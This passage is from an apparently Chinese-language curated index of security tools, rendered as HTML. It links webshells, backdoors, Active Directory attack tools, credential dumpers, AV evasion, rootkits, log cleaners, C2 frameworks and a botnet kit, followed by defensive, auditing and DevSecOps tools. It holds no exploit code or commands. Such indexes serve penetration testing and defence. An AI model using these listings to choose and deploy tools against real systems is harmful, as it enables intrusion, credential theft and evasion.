href='https://github.com/rebeyond/Behinder'><span>冰蝎</span></a><span> 动态二进制加密网站管理客户端</span></li><li><a href='https://github.com/epinna/weevely3'><span>weevely3</span></a><span> Weaponized web shell</span></li><li><a href='https://github.com/keepwn/Altman'><span>Altman</span></a><span> the cross platform webshell tool in .NET</span></li><li><a href='https://github.com/WangYihang/Webshell-Sniper'><span>Webshell Sniper</span></a><span> Manage your website via terminal</span></li><li><a href='https://github.com/Smaash/quasibot'><span>quasibot</span></a><span> complex webshell manager, quasi-http botnet</span></li></ul></li><li><h3 id='webshell-5'><span>WebShell</span></h3><ul><li><a href='https://github.com/tennc/webshell'><span>webshell</span></a></li><li><a href='https://github.com/bartblaze/PHP-backdoors'><span>PHP backdoors</span></a></li><li><a href='https://github.com/Arrexel/phpbash'><span>php bash - semi-interactive web shell</span></a></li><li><a href='https://github.com/Eitenne/TopHat.git'><span>Python RSA Encrypted Shell</span></a></li><li><a href='https://github.com/b374k/b374k'><span>b374k - PHP WebShell Custom Tool</span></a></li><li><a href='https://github.com/threedr3am/JSP-Webshells'><span>JSP Webshells</span></a></li><li><a href='https://github.com/jweny/MemShellDemo'><span>MemShellDemo</span></a></li></ul></li><li><h3 id='web-后门'><span>Web 后门</span></h3><ul><li><a href='https://github.com/t57root/pwnginx'><span>pwnginx</span></a></li><li><a href='https://github.com/WangYihang/Apache-HTTP-Server-Module-Backdoor'><span>Apache backdoor</span></a></li><li><a href='https://github.com/cobbr/SharpGen'><span>SharpGen</span></a><span> .NET Core console application that utilizes the Rosyln C# compiler to quickly cross-compile</span></li></ul></li></ol></li></ol><blockquote><p><span>.NET Framework console applications or libraries</span></p></blockquote><ul><li><a href='https://github.com/0x09AL/IIS-Raid'><span>IIS-Raid</span></a><span> A native backdoor module for Microsoft IIS</span></li></ul><ol start='3' ><li><h2 id='横向移动-2'><span>横向移动</span></h2><ol start='' ><li><h3 id='域-3'><span>域</span></h3><ul><li><a href='https://github.com/SecureAuthCorp/impacket'><span>impacket</span></a><span> is a collection of Python classes for working with network protocols</span></li><li><a href='https://github.com/dirkjanm/adidnsdump'><span>adidnsdump</span></a><span> Active Directory Integrated DNS dump tool</span></li><li><a href='https://github.com/BloodHoundAD/BloodHound'><span>BloodHound</span></a><span> Six Degrees of Domain Admin</span></li><li><a href='https://github.com/PlumHound/PlumHound'><span>PlumHound</span></a><span> Bloodhound for Blue and Purple Teams</span></li><li><a href='https://github.com/ropnop/windapsearch'><span>windapsearch</span></a><span> Python script to enumerate users, groups and computers from a Windows domain through LDAP queries</span></li><li><a href='https://github.com/dirkjanm/ldapdomaindump'><span>ldapdomaindump</span></a><span> Active Directory information dumper via LDAP</span></li><li><a href='https://github.com/nidem/kerberoast'><span>Kerberoast</span></a><span> a series of tools for attacking MS Kerberos implementations</span></li><li><a href='https://github.com/sense-of-security/ADRecon'><span>ADRecon</span></a><span> Active Directory Recon</span></li><li><a href='https://github.com/S3cur3Th1sSh1t/Creds'><span>Creds</span></a><span> Some usefull Scripts and Executables for Pentest &amp; Forensics</span></li><li><a href='https://github.com/lithnet/ad-password-protection'><span>Lithnet Password Protection for Active Directory</span></a><span> Active Directory password filter featuring breached password checking and custom complexity rules</span></li><li><a href='https://github.com/HarmJ0y/ASREPRoast'><span>ASREPRoast</span></a><span> Project that retrieves crackable hashes from KRB5 AS-REP responses for users without kerberoast preauthentication enabled.</span></li></ul></li><li><h3 id='ldap'><span>LDAP</span></h3><ul><li><a href='https://github.com/BloodHoundAD/SharpHound3'><span>SharpHound3</span></a><span> Data Collector for the BloodHound Project</span></li></ul></li><li><h3 id='微软系产品利用'><span>微软系产品利用</span></h3><ul><li><a href='https://github.com/mdsecresearch/LyncSniper'><span>LyncSniper</span></a><span> A tool for penetration testing Skype for Business and Lync deployments</span></li><li><a href='https://github.com/dafthack/MSOLSpray'><span>MSOLSpray</span></a><span> A password spraying tool for Microsoft Online accounts (Azure/O365)</span></li><li><a href='https://github.com/dafthack/MailSniper'><span>MailSniper</span></a><span> MailSniper is a penetration testing tool for searching through email in a Microsoft Exchange environment for specific terms</span></li></ul></li><li><h3 id='azure-ad'><span>Azure AD</span></h3><ul><li><a href='https://github.com/dirkjanm/ROADtools'><span>ROADtools</span></a><span> Azure AD exploration framework</span></li></ul></li><li><h3 id='exchange'><span>Exchange</span></h3><ul><li><a href='https://github.com/sensepost/ruler'><span>ruler</span></a><span> A tool to abuse Exchange services</span></li><li><a href='https://github.com/dafthack/MailSniper'><span>MailSniper</span></a></li><li><a href='https://github.com/dirkjanm/PrivExchange'><span>PrivExchange</span></a><span> Exchange your privileges for Domain Admin privs by abusing Exchange</span></li></ul></li><li><h3 id='powershell-2'><span>PowerShell</span></h3><ul><li><a href='https://github.com/PowerShellMafia'><span>PowerShellMafia</span></a></li></ul></li><li><h3 id='内网信息收集'><span>内网信息收集</span></h3><ul><li><a href='https://github.com/scallywag/nbtscan'><span>nbtscan</span></a><span> NetBIOS scanning tool</span></li><li><a href='https://github.com/djhohnstein/SharpShares'><span>SharpShares</span></a><span> Quick and dirty binary to list network share information from all machines in the current domain and if they</span>’<span>re readable</span></li><li><a href='https://github.com/nccgroup/WinShareEnum'><span>WinShareEnum</span></a><span> Windows Share Enumerator</span></li><li><a href='https://github.com/moonD4rk/HackBrowserData'><span>HackBrowserData</span></a><span> 全平台的浏览器数据导出工具</span></li></ul></li><li><h3 id='kerberos-2'><span>Kerberos</span></h3><ul><li><a href='https://github.com/GhostPack/Rubeus'><span>Rubeus</span></a></li><li><a href='https://github.com/ropnop/kerbrute'><span>kerbrute</span></a><span> A tool to perform Kerberos pre-auth bruteforcing</span></li><li><a href='https://github.com/nidem/kerberoast'><span>kerberoast</span></a><span> A series of tools for attacking MS Kerberos implementations</span></li></ul></li><li><h3 id='自动化审计-1'><span>自动化审计</span></h3><ul><li><a href='https://github.com/guardicore/monkey'><span>Infection Monkey</span></a><span> Data center Security Testing Tool</span></li></ul></li><li><h3 id='绕过-3'><span>绕过</span></h3><ul><li><a href='https://github.com/jthuraisamy/SysWhispers'><span>SysWhispers</span></a><span> AV/EDR evasion via direct system calls</span></li><li><a href='https://github.com/jthuraisamy/SysWhispers2'><span>SysWhispers2</span></a><span> AV/EDR evasion via direct system calls</span></li><li><a href='https://github.com/outflanknl/Dumpert'><span>Dumpert</span></a><span> LSASS memory dumper using direct system calls and API unhooking</span></li></ul></li><li><h3 id='内网扫描'><span>内网扫描</span></h3><ul><li><a href='https://github.com/inbug-team/InScan'><span>InScan</span></a><span> 边界打点后的自动化渗透工具</span></li><li><a href='https://github.com/shadow1ng/fscan'><span>fscan</span></a><span> 一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。</span></li></ul></li></ol></li><li><h2 id='云安全-云安全-1'><span>云安全 {#云安全-1}</span></h2><ol start='' ><li><h3 id='云环境自动测试'><span>云环境自动测试</span></h3></li></ol></li></ol><h4 id='k8s'><span>k8s</span></h4><ul><li><a href='https://github.com/bridgecrewio/checkov'><span>checkov</span></a><span> Prevent cloud misconfigurations during build-time for Terraform, Cloudformation, Kubernetes, Serverless framework and other infrastructure-as-code-languages with Checkov by Bridgecrew</span></li><li><a href='https://github.com/cdk-team/CDK'><span>CDK</span></a><span> Zero Dependency Container Penetration Toolkit</span></li><li><a href='https://github.com/aquasecurity/kube-bench'><span>kube bench</span></a></li><li><a href='https://github.com/aquasecurity/kube-hunter'><span>kube hunter</span></a><span> Hunt for security weaknesses in Kubernetes clusters</span></li><li><a href='https://github.com/cyberark/KubiScan'><span>KubiScan</span></a><span> A tool to scan Kubernetes cluster for risky permissions</span></li><li><a href='https://github.com/armosec/kubescape'><span>kubescape</span></a><span> kubescape is the first tool for testing if Kubernetes is deployed securely as defined in Ku- bernetes Hardening Guidance by to NSA and CISA</span></li><li><a href='https://github.com/Shopify/kubeaudit'><span>kubeaudit</span></a><span> kubeaudit helps you audit your Kubernetes clusters against common security controls</span></li><li><a href='https://github.com/inguardians/peirates'><span>peirates</span></a><span> Kubernetes Penetration Testing tool</span></li><li><a href='https://github.com/datreeio/datree'><span>datree</span></a><span> Prevent Kubernetes misconfigurations from reaching production</span></li></ul><h4 id='容器-2'><span>容器</span></h4><ul><li><a href='https://github.com/brompwnie/botb'><span>botb</span></a><span> A container analysis and exploitation tool for pentesters and engineers</span></li></ul><ol start='2' ><li><h3 id='安全加固-2'><span>安全加固</span></h3><ul><li><a href='https://github.com/falcosecurity/falco'><span>falco</span></a><span> Cloud Native Runtime Security</span></li></ul></li><li><h3 id='云上扫描'><span>云上扫描</span></h3><ul><li><a href='https://github.com/cloud-custodian/cloud-custodian'><span>Cloud Custodian</span></a><span> Rules engine for cloud security, cost optimization, and governance, DSL in yaml for policies to query, filter, and take actions on resources</span></li><li><a href='https://github.com/cloudquery/cloudquery'><span>cloudquery</span></a><span> cloudquery transforms your cloud infrastructure into SQL database for easy monitoring, governance and security</span></li></ul></li><li><h3 id='靶场环境'><span>靶场环境</span></h3><ul><li><a href='https://github.com/Metarget/metarget'><span>metarget</span></a><span> a framework providing automatic constructions of vulnerable infrastructures.</span></li></ul></li></ol><p>&nbsp;</p><ol start='5' ><li><h2 id='操作系统持久化'><span>操作系统持久化</span></h2><ol start='' ><li><h3 id='windows-6'><span>Windows</span></h3></li></ol></li></ol><h4 id='凭证获取-1'><span>凭证获取</span></h4><ul><li><a href='https://github.com/gentilkiwi/mimikatz'><span>mimikatz</span></a></li><li><a href='https://github.com/0x09AL/RdpThief'><span>RdpThief</span></a><span> Extracting Clear Text Passwords from mstsc.exe using API Hooking</span></li><li><a href='https://github.com/quarkslab/quarkspwdump'><span>quarkspwdump</span></a><span> Dump various types of Windows credentials without injecting in any process</span></li><li><a href='https://github.com/GhostPack/SharpDump'><span>SharpDump</span></a><span> C# port of PowerSploit</span>’<span>s Out-Minidump.ps1 functionality</span></li></ul><h4 id='权限提升-3'><span>权限提升</span></h4><ul><li><a href='https://github.com/abatchy17/WindowsExploits'><span>WindowsExploits</span></a></li><li><a href='https://github.com/GTFOBins/GTFOBins.github.io'><span>GTFOBins</span></a><span> Curated list of Unix binaries that can be exploited to bypass system security restrictions</span></li><li><a href='https://github.com/411Hall/JAWS'><span>JAWS</span></a><span> Just Another Windows (Enum) Script</span></li></ul><h4 id='uac-bypass'><span>UAC Bypass</span></h4><ul><li><a href='https://github.com/rootm0s/WinPwnage'><span>WinPwnage</span></a><span> UAC bypass, Elevate, Persistence and Execution methods</span></li><li><a href='https://github.com/hfiref0x/UACME'><span>UACME</span></a><span> Defeating Windows User Account Control</span></li><li><a href='https://github.com/sailay1996/UAC_Bypass_In_The_Wild'><span>UAC Bypass In The Wild</span></a></li></ul><h4 id='免杀'><span>免杀</span></h4><ul><li><a href='https://github.com/secretsquirrel/SigThief'><span>SigThief</span></a><span> Stealing Signatures and Making One Invalid Signature at a Time</span></li></ul><h4 id='c2-1'><span>C2</span></h4><ul><li><a href='https://github.com/cobbr/SharpSploit'><span>SharpSploit</span></a><span> .NET post-exploitation library written in C#</span></li><li><a href='https://github.com/mai1zhi2/SharpBeacon'><span>SharpBeacon</span></a><span> 用.net 重写了 CobaltStrike stager 及 Beacon，其中包括正常上线、文件管理、进程管理、令牌管理、结合 SysCall 进行注入、原生端口转发、关 ETW 等一系列功能</span></li><li><a href='https://github.com/zerosum0x0/koadic'><span>Koadic</span></a><span> is a Windows post-exploitation rootkit</span></li></ul><h4 id='隐藏'><span>隐藏</span></h4><ul><li><a href='https://github.com/M00nRise/ProcessHider'><span>ProcessHider</span></a><span> Post-exploitation tool for hiding processes from monitoring applications</span></li><li><a href='https://github.com/hlldz/Invoke-Phant0m'><span>Invoke Phant0m</span></a><span> Windows Event Log Killer</span></li><li><a href='https://github.com/QAX-A-Team/EventCleaner'><span>EventCleaner</span></a><span> A tool mainly to erase specified records from Windows event logs, with additional func- tionalities</span></li></ul><h4 id='dll-注入'><span>DLL 注入</span></h4><ul><li><a href='https://github.com/monoxgas/sRDI'><span>sRDI</span></a><span> Shellcode Reflective DLL Injection</span></li></ul><h4 id='rootkit-1'><span>rootkit</span></h4><ul><li><a href='https://github.com/bytecode77/r77-rootkit'><span>r77-rootkit</span></a><span> Ring 3 rootkit with single file installer and fileless persistence that hides processes, files, network connections, etc</span></li></ul><h4 id='伪造-3'><span>伪造</span></h4><ul><li><a href='https://github.com/countercept/ppid-spoofing'><span>parent PID spoofing</span></a><span> Scripts for performing and detecting parent PID spoofing</span></li><li><a href='https://github.com/py7hagoras/GetSystem'><span>GetSystem</span></a><span> This is a C# implementation of making a process/executable run as NT AUTHOR- ITY/SYSTEM. This is achieved through parent ID spoofing of almost any SYSTEM process.</span></li></ul><h4 id='mitm'><span>MiTM</span></h4><ul><li><a href='https://github.com/SySS-Research/Seth'><span>Seth</span></a><span> Perform a MitM attack and extract clear text credentials from RDP connections</span></li><li><a href='https://github.com/GoSecure/pyrdp'><span>pyrdp</span></a><span> RDP man-in-the-middle (mitm) and library for Python with the ability to watch connections live or after the fact</span></li></ul><h4 id='综合工具'><span>综合工具</span></h4><ul><li><a href='https://github.com/samratashok/nishang'><span>Nishang</span></a><span> Offensive PowerShell for red team, penetration testing and offensive security</span></li></ul><h3 id='linux-3'><span>Linux</span></h3><h4 id='权限提升-4'><span>权限提升</span></h4><ul><li><a href='https://github.com/mzet-/linux-exploit-suggester'><span>linux exploit suggester</span></a></li><li><a href='https://github.com/rebootuser/LinEnum'><span>LinEnum</span></a><span> Scripted Local Linux Enumeration &amp; Privilege Escalation Checks</span></li><li><a href='https://github.com/ngalongc/AutoLocalPrivilegeEscalation'><span>AutoLocalPrivilegeEscalation</span></a></li><li><a href='https://github.com/liamg/traitor'><span>traitor</span></a><span> Automatic Linux privesc via exploitation of low-hanging fruit e.g. gtfobins, pwnkit, dirty pipe,</span></li></ul><blockquote><p><span>+w docker.sock</span></p></blockquote><h4 id='rootkit-2'><span>rootkit</span></h4><ul><li><a href='https://github.com/nurupo/rootkit'><span>rootkit</span></a></li><li><a href='https://github.com/m0nad/Diamorphine'><span>Diamorphine</span></a><span> LKM rootkit for Linux Kernels 2.6.x/3.x/4.x/5.x (x86/x86_64 and ARM64)</span></li></ul><h4 id='后门-4'><span>后门</span></h4><ul><li><a href='https://github.com/andreafabrizi/prism'><span>prism</span></a><span> is an user space stealth reverse shell backdoor</span></li><li><a href='https://github.com/inquisb/icmpsh'><span>icmpsh</span></a><span> Simple reverse ICMP shell</span></li></ul><h3 id='综合-3'><span>综合</span></h3><h4 id='凭证获取-2'><span>凭证获取</span></h4><ul><li><a href='https://github.com/mthbernardes/sshLooterC'><span>sshLooterC</span></a><span> program to steal passwords from ssh</span></li><li><a href='https://github.com/juuso/keychaindump'><span>keychaindump</span></a><span> A proof-of-concept tool for reading OS X keychain passwords</span></li><li><a href='https://github.com/AlessandroZ/LaZagne'><span>LaZagne</span></a><span> Credentials recovery project</span></li><li><a href='https://github.com/deepfence/SecretScanner'><span>SecretScanner</span></a><span> Find secrets and passwords in container images and file systems</span></li></ul><h4 id='权限提升-5'><span>权限提升</span></h4><ul><li><a href='https://github.com/AlessandroZ/BeRoot'><span>BeRoot</span></a><span> Privilege Escalation Project - Windows / Linux / Mac</span></li></ul><h4 id='rat'><span>RAT</span></h4><ul><li><a href='https://github.com/quasar/QuasarRAT'><span>QuasarRAT</span></a></li></ul><h4 id='c2-2'><span>C2</span></h4><ul><li><a href='https://github.com/EmpireProject/Empire'><span>Empire</span></a></li><li><a href='https://github.com/n1nj4sec/pupy'><span>pupy</span></a></li><li><a href='https://github.com/cobbr/Covenant'><span>Covenant</span></a><span> is a collaborative .NET C2 framework for red teamers</span></li><li><a href='https://github.com/Rvn0xsy/Cooolis-ms'><span>Cooolis-ms</span></a><span> 包含了 Metasploit Payload Loader、Cobalt Strike External C2 Loader、Reflective DLL injection 的代码执行工具</span></li></ul><h4 id='dns-shell-2'><span>DNS Shell</span></h4><ul><li><a href='https://github.com/sensepost/DNS-Shell'><span>DNS Shell</span></a><span> DNS-Shell is an interactive Shell over DNS channel</span></li><li><a href='https://github.com/ahhh/Reverse_DNS_Shell'><span>Reverse DNS Shell</span></a><span> A python reverse shell that uses DNS as the c2 channel</span></li></ul><h4 id='cobalt-strike-2'><span>Cobalt Strike</span></h4><ul><li><a href='https://www.cobaltstrike.com/'><span>Cobalt Strike</span></a></li><li><a href='https://github.com/gloxec/CrossC2'><span>CrossC2</span></a><span> generate CobaltStrike</span>’<span>s cross-platform payload</span></li><li><a href='https://github.com/timwhitez/Cobalt-Strike-Aggressor-Scripts'><span>Cobalt Strike Aggressor Scripts</span></a></li></ul><h4 id='日志清除'><span>日志清除</span></h4><ul><li><a href='https://github.com/Rizer0/Log-killer'><span>Log killer</span></a><span> Clear all logs in </span><span>[</span><span>linux/windows</span><span>]</span><span> servers</span></li></ul><h4 id='botnet'><span>Botnet</span></h4><ul><li><a href='https://github.com/malwaredllc/byob'><span>byob</span></a><span> Build Your Own Botnet</span></li></ul><h4 id='免杀工具'><span>免杀工具</span></h4><ul><li><a href='https://github.com/1y0n/AV_Evasion_Tool'><span>AV Evasion Tool</span></a><span> 掩日 - 免杀执行器生成工具</span></li><li><a href='https://github.com/Mr-Un1k0d3r/DKMC'><span>DKMC</span></a><span> Dont kill my cat - Malicious payload evasion tool</span></li></ul><ol start='6' ><li><h2 id='审计工具'><span>审计工具</span></h2><ol start='' ><li><h3 id='通用'><span>通用</span></h3><ul><li><a href='https://github.com/FeeiCN/cobra'><span>Cobra</span></a></li><li><a href='https://github.com/Semmle/ql'><span>Semmle QL</span></a></li><li><a href='https://github.com/CoatiSoftware/Sourcetrail'><span>Sourcetrail</span></a><span> free and open-source cross-platform source explorer</span></li><li><a href='https://github.com/knqyf263/trivy'><span>trivy</span></a><span> A Simple and Comprehensive Vulnerability Scanner for Containers, Suitable for CI</span></li><li><a href='http://www.fortify.net/'><span>fortify</span></a></li><li><a href='https://github.com/joernio/joern'><span>joern</span></a><span> Open-source code analysis platform for C/C++/Java/Binary/Javascript based on code property graphs</span></li></ul></li><li><h3 id='php-4'><span>PHP</span></h3><ul><li><a href='http://rips-scanner.sourceforge.net/'><span>RIPS</span></a></li><li><a href='https://github.com/fate0/prvd'><span>prvd</span></a></li><li><a href='https://github.com/OneSourceCat/phpvulhunter'><span>phpvulhunter</span></a></li><li><a href='https://github.com/phith0n/chip'><span>chip</span></a><span> a simple tool to detect potential security threat in php code</span></li></ul></li><li><h3 id='python-2'><span>Python</span></h3><ul><li><a href='https://github.com/shengqi158/pyvulhunter'><span>pyvulhunter</span></a></li><li><a href='https://github.com/python-security/pyt'><span>pyt</span></a></li></ul></li><li><h3 id='java-4'><span>Java</span></h3><ul><li><a href='https://github.com/find-sec-bugs/find-sec-bugs'><span>find sec bugs</span></a></li><li><a href='https://github.com/JackOfMostTrades/gadgetinspector'><span>Gadget Inspector</span></a><span> A byte code analyzer for finding deserialization gadget chains in Java applications</span></li></ul></li><li><h3 id='javascript'><span>JavaScript</span></h3><ul><li><a href='https://github.com/ajinabraham/NodeJsScan'><span>NodeJsScan</span></a></li></ul></li><li><h3 id='供应链'><span>供应链</span></h3><ul><li><a href='https://github.com/DependencyTrack/dependency-track'><span>Dependency-Track</span></a><span> is an intelligent Supply Chain Component Analysis platform that allows organiza- tions to identify and reduce risk from the use of third-party and open source components</span></li></ul></li></ol></li><li><h2 id='防御-3'><span>防御</span></h2><ol start='' ><li><h3 id='日志检查'><span>日志检查</span></h3><ul><li><a href='https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon'><span>Sysmon</span></a></li><li><a href='http://www.nirsoft.net/utils/computer_activity_view.html'><span>LastActivityView</span></a></li><li><a href='https://sourceforge.net/projects/regshot/'><span>Regshot</span></a></li><li><a href='https://github.com/kitabisa/teler'><span>teler</span></a><span> Real-time HTTP Intrusion Detection</span></li></ul></li><li><h3 id='终端监控'><span>终端监控</span></h3><ul><li><a href='https://github.com/yarox24/attack_monitor'><span>attack monitor</span></a><span> Endpoint detection &amp; Malware analysis software</span></li><li><a href='https://github.com/BinaryDefense/artillery'><span>artillery</span></a><span> The Artillery Project is an open-source blue team tool designed to protect Linux and Windows operating systems through multiple methods.</span></li><li><a href='https://github.com/paypal/yurita'><span>yurita</span></a><span> Anomaly detection framework @ PayPal</span></li><li><a href='https://github.com/crowdsecurity/crowdsec'><span>crowdsec</span></a><span> An open-source, lightweight agent to detect and respond to bad behaviours</span></li><li><a href='https://github.com/aquasecurity/tracee'><span>tracee</span></a><span> Linux Runtime Security and Forensics using eBPF</span></li></ul></li><li><h3 id='xss-防护'><span>XSS 防护</span></h3><ul><li><a href='https://github.com/leizongmin/js-xss'><span>js xss</span></a></li><li><a href='https://github.com/cure53/DOMPurify'><span>DOMPurify</span></a></li><li><a href='https://csp-evaluator.withgoogle.com/'><span>google csp evaluator</span></a></li></ul></li><li><h3 id='配置检查'><span>配置检查</span></h3><ul><li><a href='https://github.com/microsoft/AttackSurfaceAnalyzer'><span>Attack Surface Analyzer</span></a><span> analyze operating system</span>’<span>s security configuration for changes during software installation.</span></li><li><a href='https://github.com/yandex/gixy'><span>gixy</span></a><span> Nginx 配置检查工具</span></li><li><a href='https://github.com/cr0hn/dockerscan'><span>dockerscan</span></a><span> Docker security analysis &amp; hacking tools</span></li></ul></li><li><h3 id='安全检查'><span>安全检查</span></h3><ul><li><a href='https://github.com/CISOfy/lynis'><span>lynis</span></a><span> Security auditing tool for Linux, macOS, and UNIX-based systems</span></li><li><a href='https://github.com/rfxn/linux-malware-detect'><span>linux malware detect</span></a></li></ul></li><li><h3 id='ids-1'><span>IDS</span></h3><ul><li><a href='https://github.com/ossec/ossec-hids'><span>ossec</span></a></li><li><a href='https://github.com/ysrc/yulong-hids'><span>yulong</span></a></li><li><a href='https://github.com/DianrongSecurity/AgentSmith-HIDS'><span>AgentSmith</span></a></li><li><a href='https://github.com/bytedance/ByteDance-HIDS'><span>ByteDance HIDS</span></a><span> Cloud-Native Host-Based Intrusion Detection</span></li></ul></li><li><h3 id='rasp-2'><span>RASP</span></h3><ul><li><a href='https://github.com/bytedance/Elkeid'><span>Elkeid</span></a><span> Cloud-Native Host-Based Intrusion Detection solution project to provide next-generation Threat Detection and Behavior Audition with modern architecture</span></li><li><a href='https://github.com/baidu-security/openrasp-iast'><span>openrasp</span></a><span> IAST 灰盒扫描工具</span></li></ul></li><li><h3 id='siem-1'><span>SIEM</span></h3><ul><li><a href='https://github.com/panther-labs/panther'><span>panther</span></a><span> Detect threats with log data and improve cloud security posture</span></li></ul></li><li><h3 id='威胁情报-2'><span>威胁情报</span></h3><ul><li><a href='https://threatfeeds.io/'><span>threatfeeds</span></a></li><li><a href='https://www.abuseipdb.com/'><span>abuseipdb</span></a></li></ul></li><li><h3 id='apt-1'><span>APT</span></h3><ul><li><a href='https://docs.google.com/spreadsheets/d/1H9_xaxQHpWaa4O_Son4Gx0YOIzlcBWMsdvePFX68EKU/pubhtml'><span>APT Groups and Operations</span></a></li><li><a href='https://github.com/kbandla/APTnotes'><span>APTnotes</span></a></li><li><a href='https://github.com/ahmedkhlief/APT-Hunter'><span>APT Hunter</span></a><span> Threat Hunting tool for windows event logs which made by purple team mindset to provide detect APT movements hidden in the sea of windows event logs to decrease the time to uncover suspicious activity</span></li></ul></li><li><h3 id='入侵检查'><span>入侵检查</span></h3><ul><li><a href='https://www.huorong.cn/'><span>huorong</span></a></li><li><a href='http://www.chkrootkit.org/'><span>check rootkit</span></a></li><li><a href='http://rkhunter.sourceforge.net/'><span>rootkit hunter</span></a></li><li><a href='http://www.xuetr.com/'><span>PC Hunter</span></a></li><li><a href='https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns'><span>autoruns</span></a></li></ul></li><li><h3 id='进程查看'><span>进程查看</span></h3><ul><li><a href='https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer'><span>Process Explorer</span></a></li><li><a href='https://processhacker.sourceforge.io/'><span>ProcessHacker</span></a></li></ul></li><li><h3 id='waf-1'><span>Waf</span></h3><ul><li><a href='https://github.com/nbs-system/naxsi'><span>naxsi</span></a></li><li><a href='https://github.com/SpiderLabs/ModSecurity'><span>ModSecurity</span></a></li><li><a href='https://github.com/loveshell/ngx_lua_waf'><span>ngx_lua_waf</span></a></li><li><a href='https://github.com/titansec/OpenWAF'><span>OpenWAF</span></a></li></ul></li><li><h3 id='病毒在线查杀'><span>病毒在线查杀</span></h3><ul><li><a href='https://www.virustotal.com/'><span>virustotal</span></a></li><li><a href='http://www.virscan.org/'><span>virscan</span></a></li><li><a href='https://habo.qq.com/'><span>habo</span></a></li></ul></li><li><h3 id='webshell-查杀'><span>WebShell 查杀</span></h3><ul><li><a href='http://www.d99net.net/index.asp'><span>D 盾</span></a></li><li><a href='http://edr.sangfor.com.cn/backdoor_detection.html'><span>深信服 WebShell 查杀</span></a></li><li><a href='https://github.com/nbs-system/php-malware-finder'><span>php malware finder</span></a></li></ul></li><li><h3 id='规则--ioc'><span>规则 / IoC</span></h3><ul><li><a href='https://github.com/eset/malware-ioc'><span>malware ioc</span></a></li><li><a href='https://github.com/fireeye/iocs'><span>fireeye public iocs</span></a></li><li><a href='https://github.com/Neo23x0/signature-base'><span>signature base</span></a></li><li><a href='https://github.com/Yara-Rules/rules'><span>yara rules</span></a></li><li><a href='https://github.com/fireeye/capa-rules'><span>capa rules</span></a><span> standard collection of rules for capa</span></li><li><a href='https://github.com/ptresearch/AttackDetection'><span>AttackDetection</span></a><span> Suricata PT Open Ruleset</span></li><li><a href='https://github.com/StrangerealIntel/DailyIOC'><span>DailyIOC</span></a><span> IOC from articles, tweets for archives</span></li></ul></li><li><h3 id='威胁检测'><span>威胁检测</span></h3><ul><li><a href='https://github.com/CRED-CLUB/ARTIF'><span>ARTIF</span></a><span> An advanced real time threat intelligence framework to identify threats and malicious web traffic on the basis of IP reputation and historical data</span></li></ul></li><li><h3 id='security-advisories'><span>Security Advisories</span></h3><ul><li><a href='https://httpd.apache.org/security/'><span>Apache httpd Security Advisories</span></a></li><li><a href='https://lucene.apache.org/solr/security.html'><span>Apache Solr</span></a></li><li><a href='https://tomcat.apache.org/security-8.html'><span>Apache Tomcat</span></a></li><li><a href='https://www.eclipse.org/jetty/documentation/current/security-reports.html'><span>Jetty Security Reports</span></a></li><li><a href='http://nginx.org/en/security_advisories.html'><span>Nginx Security Advisories</span></a></li><li><a href='https://www.openssl.org/news/vulnerabilities.html'><span>OpenSSL</span></a></li></ul></li><li><h3 id='security-tracker'><span>Security Tracker</span></h3><ul><li><a href='https://security-tracker.debian.org/tracker/source-package/nginx'><span>Nginx Security Tracker</span></a></li></ul></li><li><h3 id='匹配工具'><span>匹配工具</span></h3><ul><li><a href='https://github.com/VirusTotal/yara'><span>yara</span></a><span> The pattern matching swiss knife</span></li><li><a href='https://github.com/fireeye/capa'><span>capa</span></a><span> The FLARE team</span>’<span>s open-source tool to identify capabilities in executable files.</span></li></ul></li><li><h3 id='dos-防护'><span>DoS 防护</span></h3><ul><li><em><span>Gatekeeper </span><span>&lt;</span><a href='https://github.com/AltraMayor/gatekeeper' target='_blank' class='url'>https://github.com/AltraMayor/gatekeeper</a><span>&gt;</span>’<span>_</span></em><span> open-source DDoS protection system</span></li></ul></li><li><h3 id='对手模拟'><span>对手模拟</span></h3><ul><li><a href='https://github.com/BishopFox/sliver'><span>sliver</span></a><span> Adversary Simulation Framework</span></li></ul></li><li><h3 id='入侵防护'><span>入侵防护</span></h3><ul><li><a href='https://github.com/fail2ban/fail2ban'><span>fail2ban</span></a></li></ul></li></ol></li><li><h2 id='安全开发-安全开发'><span>安全开发 {#安全开发}</span></h2><ol start='' ><li><h3 id='风险控制-2'><span>风险控制</span></h3><ul><li><a href='https://github.com/momosecurity/aswan'><span>aswan</span></a><span> 陌陌风控系统静态规则引擎</span></li></ul></li><li><h3 id='静态分析-2'><span>静态分析</span></h3><ul><li><a href='https://github.com/squizlabs/PHP_CodeSniffer'><span>PHP CodeSniffer</span></a><span> tokenizes PHP files and detects violations of a defined set of coding standards</span></li></ul></li><li><h3 id='安全编码规范'><span>安全编码规范</span></h3><ul><li><a href='https://github.com/momosecurity/rhizobia_J'><span>JAVA 安全 SDK 及编码规范</span></a></li><li><a href='https://github.com/momosecurity/rhizobia_P'><span>PHP 安全 SDK 及编码规范</span></a></li></ul></li><li><h3 id='漏洞管理'><span>漏洞管理</span></h3><ul><li><a href='https://github.com/martinzhou2015/SRCMS'><span>SRCMS</span></a></li><li><a href='https://github.com/creditease-sec/insight'><span>洞察</span></a><span> 宜信集应用系统资产管理、漏洞全生命周期管理、安全知识库管理三位一体的平台</span></li><li><a href='https://github.com/ysrc/xunfeng'><span>xunfeng</span></a><span> 适用于企业内网的漏洞快速应急，巡航扫描系统</span></li><li><a href='https://github.com/DefectDojo/django-DefectDojo'><span>DefectDojo</span></a><span> an open-source application vulnerability correlation and security orchestration tool</span></li><li><a href='https://github.com/jeffzh3ng/Fuxi-Scanner'><span>Fuxi Scanner</span></a><span> Penetration Testing Platform</span></li><li><a href='https://gitee.com/gy071089/SecurityManageFramwork'><span>SeMF</span></a><span> 企业内网安全管理平台，包含资产管理，漏洞管理，账号管理，知识库管、安全扫描自动化功能模块</span></li></ul></li><li><h3 id='devsecops'><span>DevSecOps</span></h3><ul><li><a href='https://github.com/ztosec/hunter'><span>hunter</span></a><span> 中通 DevSecOps 闭环方案，被动式漏洞扫描器</span></li></ul></li></ol></li><li><h2 id='运维-1'><span>运维</span></h2><ol start='' ><li><h3 id='流量'><span>流量</span></h3><ul><li><a href='https://www.bro.org/'><span>Bro</span></a></li><li><a href='https://github.com/aol/moloch'><span>Moloch</span></a><span> Large scale, open source, indexed packet capture and search</span></li><li><a 